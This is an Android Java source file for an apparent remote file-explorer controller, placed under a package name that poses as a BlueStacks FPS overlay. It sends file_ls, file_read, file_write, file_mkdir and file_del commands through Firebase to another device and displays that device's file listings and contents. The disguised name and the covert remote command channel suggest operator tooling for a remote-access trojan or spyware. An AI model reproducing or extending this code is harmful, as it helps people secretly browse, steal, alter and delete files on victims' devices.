package com.bluestacks.fpsoverlay.controller;

import android.content.Context;
import android.util.Base64;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class FileModule {
    private final Context context;
    private final DatabaseReference dataRef;
    private final CommandSender commandSender;
    private String selectedPath = "";

    public interface CommandSender {
        void send(String cmd);
    }

    public FileModule(Context context, DatabaseReference dataRef, CommandSender commandSender) {
        this.context = context;
        this.dataRef = dataRef;
        this.commandSender = commandSender;
    }

    public void showDialog() {
        View view = LayoutInflater.from(context).inflate(R.layout.dialog_list, null);
        TextView titleText = view.findViewById(R.id.dialogTitle);
        TextView pathText = view.findViewById(R.id.currentPathText);
        RecyclerView rv = view.findViewById(R.id.recyclerView);
        Button btnAdd = view.findViewById(R.id.btnNewFolder);
        Button btnDel = view.findViewById(R.id.btnDelFile);
        
        titleText.setText("File Explorer");
        pathText.setVisibility(View.VISIBLE);
        btnAdd.setVisibility(View.VISIBLE);
        btnDel.setVisibility(View.VISIBLE);

        rv.setLayoutManager(new LinearLayoutManager(context));
        GenericAdapter adapter = new GenericAdapter();
        rv.setAdapter(adapter);

        AlertDialog dialog = new AlertDialog.Builder(context, androidx.appcompat.R.style.Theme_AppCompat_Light_NoActionBar)
                .setView(view).create();
        view.findViewById(R.id.btnClose).setOnClickListener(v -> dialog.dismiss());

        adapter.setOnItemClickListener(item -> {
            String type = item.get("type");
            String path = item.get("path");
            selectedPath = path;
            if ("dir".equals(type)) {
                commandSender.send("file_ls:" + path);
            } else if ("file".equals(type)) {
                commandSender.send("file_read:" + path);
            }
        });

        btnAdd.setOnClickListener(v -> {
            String current = pathText.getText().toString();
            showInputDialog("New Folder Name", name -> {
                commandSender.send("file_mkdir:" + current + "/" + name);
            });
        });

        btnDel.setOnClickListener(v -> {
            if (selectedPath.isEmpty()) return;
            new AlertDialog.Builder(context).setTitle("Delete?").setMessage(selectedPath)
                .setPositiveButton("Yes", (d, w) -> {
                    commandSender.send("file_del:" + selectedPath);
                    selectedPath = "";
                }).setNegativeButton("No", null).show();
        });

        dataRef.child("files").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.hasChild("current_path")) {
                    pathText.setText(snapshot.child("current_path").getValue(String.class));
                }
                
                List<Map<String, String>> dataList = new ArrayList<>();
                for (DataSnapshot ds : snapshot.child("ls").getChildren()) {
                    Map<String, String> m = new HashMap<>();
                    m.put("title", ds.child("name").getValue(String.class));
                    m.put("path", ds.child("path").getValue(String.class));
                    boolean isDir = ds.child("isDir").getValue(Boolean.class) != null && ds.child("isDir").getValue(Boolean.class);
                    m.put("sub", isDir ? "Folder" : "File (" + ds.child("size").getValue() + " bytes)");
                    m.put("type", isDir ? "dir" : "file");
                    dataList.add(m);
                }
                adapter.setData(dataList);

                if (snapshot.hasChild("content") && snapshot.hasChild("current_path")) {
                    String content = snapshot.child("content").getValue(String.class);
                    String path = snapshot.child("current_path").getValue(String.class);
                    if (content != null && !content.isEmpty()) {
                        showEditorDialog(path, content);
                        snapshot.child("content").getRef().removeValue();
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });

        dialog.show();
    }

    private void showInputDialog(String title, InputCallback callback) {
        EditText input = new EditText(context);
        new AlertDialog.Builder(context).setTitle(title).setView(input)
                .setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()))
                .setNegativeButton("Cancel", null).show();
    }

    private void showEditorDialog(String path, String b64Content) {
        View view = LayoutInflater.from(context).inflate(R.layout.dialog_editor, null);
        EditText editor = view.findViewById(R.id.fileEditor);
        TextView nameText = view.findViewById(R.id.fileNameText);
        nameText.setText(path.substring(path.lastIndexOf("/") + 1));

        try {
            byte[] data = Base64.decode(b64Content, Base64.DEFAULT);
            editor.setText(new String(data));
        } catch (Exception e) {
            editor.setText("Error decoding file");
        }

        AlertDialog dialog = new AlertDialog.Builder(context, androidx.appcompat.R.style.Theme_AppCompat_Light_NoActionBar)
                .setView(view).create();
        view.findViewById(R.id.btnCancelEdit).setOnClickListener(v -> dialog.dismiss());
        view.findViewById(R.id.btnSaveFile).setOnClickListener(v -> {
            String newContent = Base64.encodeToString(editor.getText().toString().getBytes(), Base64.NO_WRAP);
            commandSender.send("file_write:" + path + "|" + newContent);
            dialog.dismiss();
            Toast.makeText(context, "Save command sent", Toast.LENGTH_SHORT).show();
        });
        dialog.show();
    }

    interface InputCallback { void onInput(String text); }
}